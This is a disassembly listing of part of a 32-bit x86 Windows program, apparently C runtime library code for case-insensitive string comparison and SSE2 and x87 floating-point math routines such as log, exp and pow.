  40a4b5:	b3 5a                	mov    $0x5a,%bl
  40a4b7:	b6 20                	mov    $0x20,%dh
  40a4b9:	8d 49 00             	lea    0x0(%ecx),%ecx
  40a4bc:	8a 26                	mov    (%esi),%ah
  40a4be:	0a e4                	or     %ah,%ah
  40a4c0:	8a 07                	mov    (%edi),%al
  40a4c2:	74 27                	je     0x40a4eb
  40a4c4:	0a c0                	or     %al,%al
  40a4c6:	74 23                	je     0x40a4eb
  40a4c8:	83 c6 01             	add    $0x1,%esi
  40a4cb:	83 c7 01             	add    $0x1,%edi
  40a4ce:	3a e7                	cmp    %bh,%ah
  40a4d0:	72 06                	jb     0x40a4d8
  40a4d2:	3a e3                	cmp    %bl,%ah
  40a4d4:	77 02                	ja     0x40a4d8
  40a4d6:	02 e6                	add    %dh,%ah
  40a4d8:	3a c7                	cmp    %bh,%al
  40a4da:	72 06                	jb     0x40a4e2
  40a4dc:	3a c3                	cmp    %bl,%al
  40a4de:	77 02                	ja     0x40a4e2
  40a4e0:	02 c6                	add    %dh,%al
  40a4e2:	3a e0                	cmp    %al,%ah
  40a4e4:	75 0b                	jne    0x40a4f1
  40a4e6:	83 e9 01             	sub    $0x1,%ecx
  40a4e9:	75 d1                	jne    0x40a4bc
  40a4eb:	33 c9                	xor    %ecx,%ecx
  40a4ed:	3a e0                	cmp    %al,%ah
  40a4ef:	74 09                	je     0x40a4fa
  40a4f1:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
  40a4f6:	72 02                	jb     0x40a4fa
  40a4f8:	f7 d9                	neg    %ecx
  40a4fa:	8b c1                	mov    %ecx,%eax
  40a4fc:	5b                   	pop    %ebx
  40a4fd:	5e                   	pop    %esi
  40a4fe:	5f                   	pop    %edi
  40a4ff:	c9                   	leave
  40a500:	c3                   	ret
  40a501:	8b ff                	mov    %edi,%edi
  40a503:	55                   	push   %ebp
  40a504:	8b ec                	mov    %esp,%ebp
  40a506:	51                   	push   %ecx
  40a507:	a1 60 47 41 00       	mov    0x414760,%eax
  40a50c:	83 f8 fe             	cmp    $0xfffffffe,%eax
  40a50f:	75 0a                	jne    0x40a51b
  40a511:	e8 8e 0d 00 00       	call   0x40b2a4
  40a516:	a1 60 47 41 00       	mov    0x414760,%eax
  40a51b:	83 f8 ff             	cmp    $0xffffffff,%eax
  40a51e:	75 07                	jne    0x40a527
  40a520:	b8 ff ff 00 00       	mov    $0xffff,%eax
  40a525:	eb 1b                	jmp    0x40a542
  40a527:	6a 00                	push   $0x0
  40a529:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  40a52c:	51                   	push   %ecx
  40a52d:	6a 01                	push   $0x1
  40a52f:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40a532:	51                   	push   %ecx
  40a533:	50                   	push   %eax
  40a534:	ff 15 20 d0 40 00    	call   *0x40d020
  40a53a:	85 c0                	test   %eax,%eax
  40a53c:	74 e2                	je     0x40a520
  40a53e:	66 8b 45 08          	mov    0x8(%ebp),%ax
  40a542:	8b e5                	mov    %ebp,%esp
  40a544:	5d                   	pop    %ebp
  40a545:	c3                   	ret
  40a546:	6a 0a                	push   $0xa
  40a548:	e8 0f 19 00 00       	call   0x40be5c
  40a54d:	a3 e0 51 41 00       	mov    %eax,0x4151e0
  40a552:	33 c0                	xor    %eax,%eax
  40a554:	c3                   	ret
  40a555:	cc                   	int3
  40a556:	cc                   	int3
  40a557:	cc                   	int3
  40a558:	cc                   	int3
  40a559:	cc                   	int3
  40a55a:	cc                   	int3
  40a55b:	cc                   	int3
  40a55c:	cc                   	int3
  40a55d:	cc                   	int3
  40a55e:	cc                   	int3
  40a55f:	cc                   	int3
  40a560:	55                   	push   %ebp
  40a561:	8b ec                	mov    %esp,%ebp
  40a563:	83 ec 08             	sub    $0x8,%esp
  40a566:	83 e4 f0             	and    $0xfffffff0,%esp
  40a569:	dd 1c 24             	fstpl  (%esp)
  40a56c:	f3 0f 7e 04 24       	movq   (%esp),%xmm0
  40a571:	e8 08 00 00 00       	call   0x40a57e
  40a576:	c9                   	leave
  40a577:	c3                   	ret
  40a578:	66 0f 12 44 24 04    	movlpd 0x4(%esp),%xmm0
  40a57e:	ba 00 00 00 00       	mov    $0x0,%edx
  40a583:	66 0f 28 e8          	movapd %xmm0,%xmm5
  40a587:	66 0f 14 c0          	unpcklpd %xmm0,%xmm0
  40a58b:	66 0f 73 d5 34       	psrlq  $0x34,%xmm5
  40a590:	66 0f c5 cd 00       	pextrw $0x0,%xmm5,%ecx
  40a595:	66 0f 28 0d 40 11 41 	movapd 0x411140,%xmm1
  40a59c:	00 
  40a59d:	66 0f 28 15 50 11 41 	movapd 0x411150,%xmm2
  40a5a4:	00 
  40a5a5:	66 0f 28 1d b0 11 41 	movapd 0x4111b0,%xmm3
  40a5ac:	00 
  40a5ad:	66 0f 28 25 60 11 41 	movapd 0x411160,%xmm4
  40a5b4:	00 
  40a5b5:	66 0f 28 35 70 11 41 	movapd 0x411170,%xmm6
  40a5bc:	00 
  40a5bd:	66 0f 54 c1          	andpd  %xmm1,%xmm0
  40a5c1:	66 0f 56 c3          	orpd   %xmm3,%xmm0
  40a5c5:	66 0f 58 e0          	addpd  %xmm0,%xmm4
  40a5c9:	66 0f c5 c4 00       	pextrw $0x0,%xmm4,%eax
  40a5ce:	25 f0 07 00 00       	and    $0x7f0,%eax
  40a5d3:	66 0f 28 a0 80 17 41 	movapd 0x411780(%eax),%xmm4
  40a5da:	00 
  40a5db:	66 0f 28 b8 70 13 41 	movapd 0x411370(%eax),%xmm7
  40a5e2:	00 
  40a5e3:	66 0f 54 f0          	andpd  %xmm0,%xmm6
  40a5e7:	66 0f 5c c6          	subpd  %xmm6,%xmm0
  40a5eb:	66 0f 59 f4          	mulpd  %xmm4,%xmm6
  40a5ef:	66 0f 5c f2          	subpd  %xmm2,%xmm6
  40a5f3:	f2 0f 58 fe          	addsd  %xmm6,%xmm7
  40a5f7:	66 0f 59 c4          	mulpd  %xmm4,%xmm0
  40a5fb:	66 0f 28 e0          	movapd %xmm0,%xmm4
  40a5ff:	66 0f 58 c6          	addpd  %xmm6,%xmm0
  40a603:	81 e1 ff 0f 00 00    	and    $0xfff,%ecx
  40a609:	83 e9 01             	sub    $0x1,%ecx
  40a60c:	81 f9 fd 07 00 00    	cmp    $0x7fd,%ecx
  40a612:	0f 87 be 00 00 00    	ja     0x40a6d6
  40a618:	81 e9 fe 03 00 00    	sub    $0x3fe,%ecx
  40a61e:	03 ca                	add    %edx,%ecx
  40a620:	f2 0f 2a f1          	cvtsi2sd %ecx,%xmm6
  40a624:	66 0f 14 f6          	unpcklpd %xmm6,%xmm6
  40a628:	c1 e1 0a             	shl    $0xa,%ecx
  40a62b:	03 c1                	add    %ecx,%eax
  40a62d:	b9 10 00 00 00       	mov    $0x10,%ecx
  40a632:	ba 00 00 00 00       	mov    $0x0,%edx
  40a637:	83 f8 00             	cmp    $0x0,%eax
  40a63a:	0f 44 d1             	cmove  %ecx,%edx
  40a63d:	66 0f 28 0d 00 12 41 	movapd 0x411200,%xmm1
  40a644:	00 
  40a645:	66 0f 28 d8          	movapd %xmm0,%xmm3
  40a649:	66 0f 28 15 10 12 41 	movapd 0x411210,%xmm2
  40a650:	00 
  40a651:	66 0f 59 c8          	mulpd  %xmm0,%xmm1
  40a655:	66 0f 59 db          	mulpd  %xmm3,%xmm3
  40a659:	66 0f 58 ca          	addpd  %xmm2,%xmm1
  40a65d:	66 0f 28 15 20 12 41 	movapd 0x411220,%xmm2
  40a664:	00 
  40a665:	f2 0f 59 db          	mulsd  %xmm3,%xmm3
  40a669:	66 0f 28 2d 80 11 41 	movapd 0x411180,%xmm5
  40a670:	00 
  40a671:	66 0f 59 f5          	mulpd  %xmm5,%xmm6
  40a675:	66 0f 28 aa 90 11 41 	movapd 0x411190(%edx),%xmm5
  40a67c:	00 
  40a67d:	66 0f 54 e5          	andpd  %xmm5,%xmm4
  40a681:	66 0f 58 fe          	addpd  %xmm6,%xmm7
  40a685:	66 0f 58 fc          	addpd  %xmm4,%xmm7
  40a689:	66 0f 59 c8          	mulpd  %xmm0,%xmm1
  40a68d:	f2 0f 59 d8          	mulsd  %xmm0,%xmm3
  40a691:	66 0f 58 ca          	addpd  %xmm2,%xmm1
  40a695:	66 0f 28 15 30 12 41 	movapd 0x411230,%xmm2
  40a69c:	00 
  40a69d:	66 0f 59 d0          	mulpd  %xmm0,%xmm2
  40a6a1:	66 0f 28 f7          	movapd %xmm7,%xmm6
  40a6a5:	66 0f 15 f6          	unpckhpd %xmm6,%xmm6
  40a6a9:	66 0f 59 cb          	mulpd  %xmm3,%xmm1
  40a6ad:	83 ec 10             	sub    $0x10,%esp
  40a6b0:	66 0f 28 c1          	movapd %xmm1,%xmm0
  40a6b4:	66 0f 58 ca          	addpd  %xmm2,%xmm1
  40a6b8:	66 0f 15 c0          	unpckhpd %xmm0,%xmm0
  40a6bc:	f2 0f 58 c1          	addsd  %xmm1,%xmm0
  40a6c0:	f2 0f 58 c6          	addsd  %xmm6,%xmm0
  40a6c4:	f2 0f 58 c7          	addsd  %xmm7,%xmm0
  40a6c8:	66 0f 13 44 24 04    	movlpd %xmm0,0x4(%esp)
  40a6ce:	dd 44 24 04          	fldl   0x4(%esp)
  40a6d2:	83 c4 10             	add    $0x10,%esp
  40a6d5:	c3                   	ret
  40a6d6:	66 0f 12 44 24 04    	movlpd 0x4(%esp),%xmm0
  40a6dc:	66 0f 28 0d c0 11 41 	movapd 0x4111c0,%xmm1
  40a6e3:	00 
  40a6e4:	f2 0f c2 c8 00       	cmpeqsd %xmm0,%xmm1
  40a6e9:	66 0f c5 c1 00       	pextrw $0x0,%xmm1,%eax
  40a6ee:	83 f8 00             	cmp    $0x0,%eax
  40a6f1:	77 48                	ja     0x40a73b
  40a6f3:	83 f9 ff             	cmp    $0xffffffff,%ecx
  40a6f6:	74 5e                	je     0x40a756
  40a6f8:	81 f9 fe 07 00 00    	cmp    $0x7fe,%ecx
  40a6fe:	77 6c                	ja     0x40a76c
  40a700:	66 0f 12 44 24 04    	movlpd 0x4(%esp),%xmm0
  40a706:	66 0f 28 0d 40 11 41 	movapd 0x411140,%xmm1
  40a70d:	00 
  40a70e:	66 0f 28 15 b0 11 41 	movapd 0x4111b0,%xmm2
  40a715:	00 
  40a716:	66 0f 54 c1          	andpd  %xmm1,%xmm0
  40a71a:	66 0f 56 c2          	orpd   %xmm2,%xmm0
  40a71e:	f2 0f c2 d0 00       	cmpeqsd %xmm0,%xmm2
  40a723:	66 0f c5 c2 00       	pextrw $0x0,%xmm2,%eax
  40a728:	83 f8 00             	cmp    $0x0,%eax
  40a72b:	74 07                	je     0x40a734
  40a72d:	dd 05 e8 11 41 00    	fldl   0x4111e8
  40a733:	c3                   	ret
  40a734:	ba e9 03 00 00       	mov    $0x3e9,%edx
  40a739:	eb 4f                	jmp    0x40a78a
  40a73b:	66 0f 12 15 b0 11 41 	movlpd 0x4111b0,%xmm2
  40a742:	00 
  40a743:	f2 0f 5e d0          	divsd  %xmm0,%xmm2
  40a747:	66 0f 12 0d e0 11 41 	movlpd 0x4111e0,%xmm1
  40a74e:	00 
  40a74f:	ba 08 00 00 00       	mov    $0x8,%edx
  40a754:	eb 34                	jmp    0x40a78a
  40a756:	66 0f 12 0d d0 11 41 	movlpd 0x4111d0,%xmm1
  40a75d:	00 
  40a75e:	f2 0f 59 c1          	mulsd  %xmm1,%xmm0
  40a762:	ba cc ff ff ff       	mov    $0xffffffcc,%edx
  40a767:	e9 17 fe ff ff       	jmp    0x40a583
  40a76c:	83 c1 01             	add    $0x1,%ecx
  40a76f:	81 e1 ff 07 00 00    	and    $0x7ff,%ecx
  40a775:	81 f9 ff 07 00 00    	cmp    $0x7ff,%ecx
  40a77b:	73 3a                	jae    0x40a7b7
  40a77d:	66 0f 57 c9          	xorpd  %xmm1,%xmm1
  40a781:	f2 0f 5e c9          	divsd  %xmm1,%xmm1
  40a785:	ba 09 00 00 00       	mov    $0x9,%edx
  40a78a:	83 ec 1c             	sub    $0x1c,%esp
  40a78d:	66 0f 13 4c 24 10    	movlpd %xmm1,0x10(%esp)
  40a793:	89 54 24 0c          	mov    %edx,0xc(%esp)
  40a797:	8b d4                	mov    %esp,%edx
  40a799:	83 c2 10             	add    $0x10,%edx
  40a79c:	89 54 24 08          	mov    %edx,0x8(%esp)
  40a7a0:	83 c2 10             	add    $0x10,%edx
  40a7a3:	89 54 24 04          	mov    %edx,0x4(%esp)
  40a7a7:	89 14 24             	mov    %edx,(%esp)
  40a7aa:	e8 24 06 00 00       	call   0x40add3
  40a7af:	dd 44 24 10          	fldl   0x10(%esp)
  40a7b3:	83 c4 1c             	add    $0x1c,%esp
  40a7b6:	c3                   	ret
  40a7b7:	66 0f 12 54 24 04    	movlpd 0x4(%esp),%xmm2
  40a7bd:	66 0f 12 44 24 04    	movlpd 0x4(%esp),%xmm0
  40a7c3:	66 0f 7e d0          	movd   %xmm2,%eax
  40a7c7:	66 0f 73 d2 20       	psrlq  $0x20,%xmm2
  40a7cc:	66 0f 7e d1          	movd   %xmm2,%ecx
  40a7d0:	81 e1 ff ff 0f 00    	and    $0xfffff,%ecx
  40a7d6:	0b c1                	or     %ecx,%eax
  40a7d8:	83 f8 00             	cmp    $0x0,%eax
  40a7db:	74 a0                	je     0x40a77d
  40a7dd:	ba e9 03 00 00       	mov    $0x3e9,%edx
  40a7e2:	eb a6                	jmp    0x40a78a
  40a7e4:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  40a7eb:	eb 03                	jmp    0x40a7f0
  40a7ed:	cc                   	int3
  40a7ee:	cc                   	int3
  40a7ef:	cc                   	int3
  40a7f0:	c6 85 70 ff ff ff fe 	movb   $0xfe,-0x90(%ebp)
  40a7f7:	0a ed                	or     %ch,%ch
  40a7f9:	75 3b                	jne    0x40a836
  40a7fb:	d9 c9                	fxch   %st(1)
  40a7fd:	d9 f1                	fyl2x
  40a7ff:	eb 0d                	jmp    0x40a80e
  40a801:	c6 85 70 ff ff ff fe 	movb   $0xfe,-0x90(%ebp)
  40a808:	32 ed                	xor    %ch,%ch
  40a80a:	d9 ea                	fldl2e
  40a80c:	de c9                	fmulp  %st,%st(1)
  40a80e:	e8 2b 01 00 00       	call   0x40a93e
  40a813:	d9 e8                	fld1
  40a815:	de c1                	faddp  %st,%st(1)
  40a817:	f6 85 61 ff ff ff 01 	testb  $0x1,-0x9f(%ebp)
  40a81e:	74 04                	je     0x40a824
  40a820:	d9 e8                	fld1
  40a822:	de f1                	fdivp  %st,%st(1)
  40a824:	f6 c2 40             	test   $0x40,%dl
  40a827:	75 02                	jne    0x40a82b
  40a829:	d9 fd                	fscale
  40a82b:	0a ed                	or     %ch,%ch
  40a82d:	74 02                	je     0x40a831
  40a82f:	d9 e0                	fchs
  40a831:	e9 b2 02 00 00       	jmp    0x40aae8
  40a836:	e8 46 01 00 00       	call   0x40a981
  40a83b:	0b c0                	or     %eax,%eax
  40a83d:	74 14                	je     0x40a853
  40a83f:	32 ed                	xor    %ch,%ch
  40a841:	83 f8 02             	cmp    $0x2,%eax
  40a844:	74 02                	je     0x40a848
  40a846:	f6 d5                	not    %ch
  40a848:	d9 c9                	fxch   %st(1)
  40a84a:	d9 e1                	fabs
  40a84c:	eb af                	jmp    0x40a7fd
  40a84e:	e9 b5 02 00 00       	jmp    0x40ab08
  40a853:	e9 4b 03 00 00       	jmp    0x40aba3
  40a858:	dd d8                	fstp   %st(0)
  40a85a:	dd d8                	fstp   %st(0)
  40a85c:	db 2d 40 12 41 00    	fldt   0x411240
  40a862:	c6 85 70 ff ff ff 02 	movb   $0x2,-0x90(%ebp)
  40a869:	c3                   	ret
  40a86a:	d9 ed                	fldln2
  40a86c:	d9 c9                	fxch   %st(1)
  40a86e:	d9 e4                	ftst
  40a870:	9b dd bd 60 ff ff ff 	fstsw  -0xa0(%ebp)
  40a877:	9b                   	fwait
  40a878:	f6 85 61 ff ff ff 41 	testb  $0x41,-0x9f(%ebp)
  40a87f:	75 d2                	jne    0x40a853
  40a881:	d9 f1                	fyl2x
  40a883:	c3                   	ret
  40a884:	c6 85 70 ff ff ff 02 	movb   $0x2,-0x90(%ebp)
  40a88b:	dd d8                	fstp   %st(0)
  40a88d:	db 2d 4a 12 41 00    	fldt   0x41124a
  40a893:	c3                   	ret
  40a894:	0a c9                	or     %cl,%cl
  40a896:	75 53                	jne    0x40a8eb
  40a898:	c3                   	ret
  40a899:	d9 ec                	fldlg2
  40a89b:	eb 02                	jmp    0x40a89f
  40a89d:	d9 ed                	fldln2
  40a89f:	d9 c9                	fxch   %st(1)
  40a8a1:	0a c9                	or     %cl,%cl
  40a8a3:	75 ae                	jne    0x40a853
  40a8a5:	d9 f1                	fyl2x
  40a8a7:	c3                   	ret
  40a8a8:	e9 5b 02 00 00       	jmp    0x40ab08
  40a8ad:	e8 cf 00 00 00       	call   0x40a981
  40a8b2:	dd d8                	fstp   %st(0)
  40a8b4:	dd d8                	fstp   %st(0)
  40a8b6:	0a c9                	or     %cl,%cl
  40a8b8:	75 0e                	jne    0x40a8c8
  40a8ba:	d9 ee                	fldz
  40a8bc:	83 f8 01             	cmp    $0x1,%eax
  40a8bf:	75 06                	jne    0x40a8c7
  40a8c1:	0a ed                	or     %ch,%ch
  40a8c3:	74 02                	je     0x40a8c7
  40a8c5:	d9 e0                	fchs
  40a8c7:	c3                   	ret
  40a8c8:	c6 85 70 ff ff ff 02 	movb   $0x2,-0x90(%ebp)
  40a8cf:	db 2d 40 12 41 00    	fldt   0x411240
  40a8d5:	83 f8 01             	cmp    $0x1,%eax
  40a8d8:	75 ed                	jne    0x40a8c7
  40a8da:	0a ed                	or     %ch,%ch
  40a8dc:	74 e9                	je     0x40a8c7
  40a8de:	d9 e0                	fchs
  40a8e0:	eb e5                	jmp    0x40a8c7
  40a8e2:	dd d8                	fstp   %st(0)
  40a8e4:	e9 0d 02 00 00       	jmp    0x40aaf6
  40a8e9:	dd d8                	fstp   %st(0)
  40a8eb:	e9 b5 02 00 00       	jmp    0x40aba5
  40a8f0:	58                   	pop    %eax
  40a8f1:	d9 e4                	ftst
  40a8f3:	9b dd bd 60 ff ff ff 	fstsw  -0xa0(%ebp)
  40a8fa:	9b                   	fwait
  40a8fb:	f6 85 61 ff ff ff 01 	testb  $0x1,-0x9f(%ebp)
  40a902:	75 0f                	jne    0x40a913
  40a904:	dd d8                	fstp   %st(0)
  40a906:	db 2d 40 12 41 00    	fldt   0x411240
  40a90c:	0a ed                	or     %ch,%ch
  40a90e:	74 02                	je     0x40a912
  40a910:	d9 e0                	fchs
  40a912:	c3                   	ret
  40a913:	c6 85 70 ff ff ff 04 	movb   $0x4,-0x90(%ebp)
  40a91a:	e9 d7 01 00 00       	jmp    0x40aaf6
  40a91f:	dd d8                	fstp   %st(0)
  40a921:	dd d8                	fstp   %st(0)
  40a923:	db 2d 40 12 41 00    	fldt   0x411240
  40a929:	c6 85 70 ff ff ff 03 	movb   $0x3,-0x90(%ebp)
  40a930:	c3                   	ret
  40a931:	0a c9                	or     %cl,%cl
  40a933:	75 af                	jne    0x40a8e4
  40a935:	dd d8                	fstp   %st(0)
  40a937:	db 2d 40 12 41 00    	fldt   0x411240
  40a93d:	c3                   	ret
  40a93e:	d9 c0                	fld    %st(0)
  40a940:	d9 e1                	fabs
  40a942:	db 2d 5e 12 41 00    	fldt   0x41125e
  40a948:	de d9                	fcompp
  40a94a:	9b dd bd 60 ff ff ff 	fstsw  -0xa0(%ebp)
  40a951:	9b                   	fwait
  40a952:	f6 85 61 ff ff ff 41 	testb  $0x41,-0x9f(%ebp)
  40a959:	75 95                	jne    0x40a8f0
  40a95b:	d9 c0                	fld    %st(0)
  40a95d:	d9 fc                	frndint
  40a95f:	d9 e4                	ftst
  40a961:	9b dd bd 60 ff ff ff 	fstsw  -0xa0(%ebp)
  40a968:	9b                   	fwait
  40a969:	8a 95 61 ff ff ff    	mov    -0x9f(%ebp),%dl
  40a96f:	d9 c9                	fxch   %st(1)
  40a971:	d8 e1                	fsub   %st(1),%st
  40a973:	d9 e4                	ftst
  40a975:	9b dd bd 60 ff ff ff 	fstsw  -0xa0(%ebp)
  40a97c:	d9 e1                	fabs
  40a97e:	d9 f0                	f2xm1
  40a980:	c3                   	ret
  40a981:	d9 c0                	fld    %st(0)
  40a983:	d9 fc                	frndint
  40a985:	d8 d9                	fcomp  %st(1)
  40a987:	9b df e0             	fstsw  %ax
  40a98a:	9e                   	sahf
  40a98b:	75 1a                	jne    0x40a9a7
  40a98d:	d9 c0                	fld    %st(0)
  40a98f:	dc 0d 72 12 41 00    	fmull  0x411272
  40a995:	d9 c0                	fld    %st(0)
  40a997:	d9 fc                	frndint
  40a999:	de d9                	fcompp
  40a99b:	9b df e0             	fstsw  %ax
  40a99e:	9e                   	sahf
  40a99f:	74 0d                	je     0x40a9ae
  40a9a1:	b8 01 00 00 00       	mov    $0x1,%eax
  40a9a6:	c3                   	ret
  40a9a7:	b8 00 00 00 00       	mov    $0x0,%eax
  40a9ac:	eb f8                	jmp    0x40a9a6
  40a9ae:	b8 02 00 00 00       	mov    $0x2,%eax
  40a9b3:	eb f1                	jmp    0x40a9a6
  40a9b5:	56                   	push   %esi
  40a9b6:	83 ec 74             	sub    $0x74,%esp
  40a9b9:	8b f4                	mov    %esp,%esi
  40a9bb:	56                   	push   %esi
  40a9bc:	83 ec 08             	sub    $0x8,%esp
  40a9bf:	dd 1c 24             	fstpl  (%esp)
  40a9c2:	83 ec 08             	sub    $0x8,%esp
  40a9c5:	dd 1c 24             	fstpl  (%esp)
  40a9c8:	9b dd 76 08          	fsave  0x8(%esi)
  40a9cc:	e8 73 09 00 00       	call   0x40b344
  40a9d1:	83 c4 14             	add    $0x14,%esp
  40a9d4:	dd 66 08             	frstor 0x8(%esi)
  40a9d7:	dd 06                	fldl   (%esi)
  40a9d9:	83 c4 74             	add    $0x74,%esp
  40a9dc:	5e                   	pop    %esi
  40a9dd:	85 c0                	test   %eax,%eax
  40a9df:	74 05                	je     0x40a9e6
  40a9e1:	e9 d0 01 00 00       	jmp    0x40abb6
  40a9e6:	c3                   	ret
  40a9e7:	cc                   	int3
  40a9e8:	cc                   	int3
  40a9e9:	cc                   	int3
  40a9ea:	cc                   	int3
  40a9eb:	cc                   	int3
  40a9ec:	cc                   	int3
  40a9ed:	cc                   	int3
  40a9ee:	cc                   	int3
  40a9ef:	cc                   	int3
  40a9f0:	80 7a 0e 05          	cmpb   $0x5,0xe(%edx)
  40a9f4:	75 11                	jne    0x40aa07
  40a9f6:	66 8b 9d 5c ff ff ff 	mov    -0xa4(%ebp),%bx
  40a9fd:	80 cf 02             	or     $0x2,%bh
  40aa00:	80 e7 fe             	and    $0xfe,%bh
  40aa03:	b3 3f                	mov    $0x3f,%bl
  40aa05:	eb 04                	jmp    0x40aa0b
  40aa07:	66 bb 3f 13          	mov    $0x133f,%bx
  40aa0b:	66 89 9d 5e ff ff ff 	mov    %bx,-0xa2(%ebp)
  40aa12:	d9 ad 5e ff ff ff    	fldcw  -0xa2(%ebp)
  40aa18:	bb ce 12 41 00       	mov    $0x4112ce,%ebx
  40aa1d:	d9 e5                	fxam
  40aa1f:	89 95 6c ff ff ff    	mov    %edx,-0x94(%ebp)
  40aa25:	9b dd bd 60 ff ff ff 	fstsw  -0xa0(%ebp)
  40aa2c:	c6 85 70 ff ff ff 00 	movb   $0x0,-0x90(%ebp)
  40aa33:	9b                   	fwait
  40aa34:	8a 8d 61 ff ff ff    	mov    -0x9f(%ebp),%cl
  40aa3a:	d0 e1                	shl    $1,%cl
  40aa3c:	d0 f9                	sar    $1,%cl
  40aa3e:	d0 c1                	rol    $1,%cl
  40aa40:	8a c1                	mov    %cl,%al
  40aa42:	24 0f                	and    $0xf,%al
  40aa44:	d7                   	xlat   %ds:(%ebx)
  40aa45:	0f be c0             	movsbl %al,%eax
  40aa48:	81 e1 04 04 00 00    	and    $0x404,%ecx
  40aa4e:	8b da                	mov    %edx,%ebx
  40aa50:	03 d8                	add    %eax,%ebx
  40aa52:	83 c3 10             	add    $0x10,%ebx
  40aa55:	ff 23                	jmp    *(%ebx)
  40aa57:	80 7a 0e 05          	cmpb   $0x5,0xe(%edx)
  40aa5b:	75 11                	jne    0x40aa6e
  40aa5d:	66 8b 9d 5c ff ff ff 	mov    -0xa4(%ebp),%bx
  40aa64:	80 cf 02             	or     $0x2,%bh
  40aa67:	80 e7 fe             	and    $0xfe,%bh
  40aa6a:	b3 3f                	mov    $0x3f,%bl
  40aa6c:	eb 04                	jmp    0x40aa72
  40aa6e:	66 bb 3f 13          	mov    $0x133f,%bx
  40aa72:	66 89 9d 5e ff ff ff 	mov    %bx,-0xa2(%ebp)
  40aa79:	d9 ad 5e ff ff ff    	fldcw  -0xa2(%ebp)
  40aa7f:	bb ce 12 41 00       	mov    $0x4112ce,%ebx
  40aa84:	d9 e5                	fxam
  40aa86:	89 95 6c ff ff ff    	mov    %edx,-0x94(%ebp)
  40aa8c:	9b dd bd 60 ff ff ff 	fstsw  -0xa0(%ebp)
  40aa93:	c6 85 70 ff ff ff 00 	movb   $0x0,-0x90(%ebp)
  40aa9a:	d9 c9                	fxch   %st(1)
  40aa9c:	8a 8d 61 ff ff ff    	mov    -0x9f(%ebp),%cl
  40aaa2:	d9 e5                	fxam
  40aaa4:	9b dd bd 60 ff ff ff 	fstsw  -0xa0(%ebp)
  40aaab:	d9 c9                	fxch   %st(1)
  40aaad:	8a ad 61 ff ff ff    	mov    -0x9f(%ebp),%ch
  40aab3:	d0 e5                	shl    $1,%ch
  40aab5:	d0 fd                	sar    $1,%ch
  40aab7:	d0 c5                	rol    $1,%ch
  40aab9:	8a c5                	mov    %ch,%al
  40aabb:	24 0f                	and    $0xf,%al
  40aabd:	d7                   	xlat   %ds:(%ebx)
  40aabe:	8a e0                	mov    %al,%ah
  40aac0:	d0 e1                	shl    $1,%cl
  40aac2:	d0 f9                	sar    $1,%cl
  40aac4:	d0 c1                	rol    $1,%cl
  40aac6:	8a c1                	mov    %cl,%al
  40aac8:	24 0f                	and    $0xf,%al
  40aaca:	d7                   	xlat   %ds:(%ebx)
  40aacb:	d0 e4                	shl    $1,%ah
  40aacd:	d0 e4                	shl    $1,%ah
  40aacf:	0a c4                	or     %ah,%al
  40aad1:	0f be c0             	movsbl %al,%eax
  40aad4:	81 e1 04 04 00 00    	and    $0x404,%ecx
  40aada:	8b da                	mov    %edx,%ebx
  40aadc:	03 d8                	add    %eax,%ebx
  40aade:	83 c3 10             	add    $0x10,%ebx
  40aae1:	ff 23                	jmp    *(%ebx)
  40aae3:	e8 ce 00 00 00       	call   0x40abb6
  40aae8:	d9 c9                	fxch   %st(1)
  40aaea:	dd d8                	fstp   %st(0)
  40aaec:	c3                   	ret
  40aaed:	e8 c4 00 00 00       	call   0x40abb6
  40aaf2:	eb f6                	jmp    0x40aaea
  40aaf4:	dd d8                	fstp   %st(0)
  40aaf6:	dd d8                	fstp   %st(0)
  40aaf8:	d9 ee                	fldz
  40aafa:	c3                   	ret
  40aafb:	dd d8                	fstp   %st(0)
  40aafd:	dd d8                	fstp   %st(0)
  40aaff:	d9 ee                	fldz
  40ab01:	84 ed                	test   %ch,%ch
  40ab03:	74 02                	je     0x40ab07
  40ab05:	d9 e0                	fchs
  40ab07:	c3                   	ret
  40ab08:	dd d8                	fstp   %st(0)
  40ab0a:	dd d8                	fstp   %st(0)
  40ab0c:	d9 e8                	fld1
  40ab0e:	c3                   	ret
  40ab0f:	db bd 62 ff ff ff    	fstpt  -0x9e(%ebp)
  40ab15:	db ad 62 ff ff ff    	fldt   -0x9e(%ebp)
  40ab1b:	f6 85 69 ff ff ff 40 	testb  $0x40,-0x97(%ebp)
  40ab22:	74 08                	je     0x40ab2c
  40ab24:	c6 85 70 ff ff ff 00 	movb   $0x0,-0x90(%ebp)
  40ab2b:	c3                   	ret
  40ab2c:	c6 85 70 ff ff ff 00 	movb   $0x0,-0x90(%ebp)
  40ab33:	dc 05 be 12 41 00    	faddl  0x4112be
  40ab39:	c3                   	ret
  40ab3a:	d9 c9                	fxch   %st(1)
  40ab3c:	db bd 62 ff ff ff    	fstpt  -0x9e(%ebp)
  40ab42:	db ad 62 ff ff ff    	fldt   -0x9e(%ebp)
  40ab48:	f6 85 69 ff ff ff 40 	testb  $0x40,-0x97(%ebp)
  40ab4f:	74 09                	je     0x40ab5a
  40ab51:	c6 85 70 ff ff ff 00 	movb   $0x0,-0x90(%ebp)
  40ab58:	eb 07                	jmp    0x40ab61
  40ab5a:	c6 85 70 ff ff ff 00 	movb   $0x0,-0x90(%ebp)
  40ab61:	de c1                	faddp  %st,%st(1)
  40ab63:	c3                   	ret
  40ab64:	db bd 62 ff ff ff    	fstpt  -0x9e(%ebp)
  40ab6a:	db ad 62 ff ff ff    	fldt   -0x9e(%ebp)
  40ab70:	f6 85 69 ff ff ff 40 	testb  $0x40,-0x97(%ebp)
  40ab77:	74 20                	je     0x40ab99
  40ab79:	d9 c9                	fxch   %st(1)
  40ab7b:	db bd 62 ff ff ff    	fstpt  -0x9e(%ebp)
  40ab81:	db ad 62 ff ff ff    	fldt   -0x9e(%ebp)
  40ab87:	f6 85 69 ff ff ff 40 	testb  $0x40,-0x97(%ebp)
  40ab8e:	74 09                	je     0x40ab99
  40ab90:	c6 85 70 ff ff ff 00 	movb   $0x0,-0x90(%ebp)
  40ab97:	eb 07                	jmp    0x40aba0
  40ab99:	c6 85 70 ff ff ff 01 	movb   $0x1,-0x90(%ebp)
  40aba0:	de c1                	faddp  %st,%st(1)
  40aba2:	c3                   	ret
  40aba3:	dd d8                	fstp   %st(0)
  40aba5:	dd d8                	fstp   %st(0)
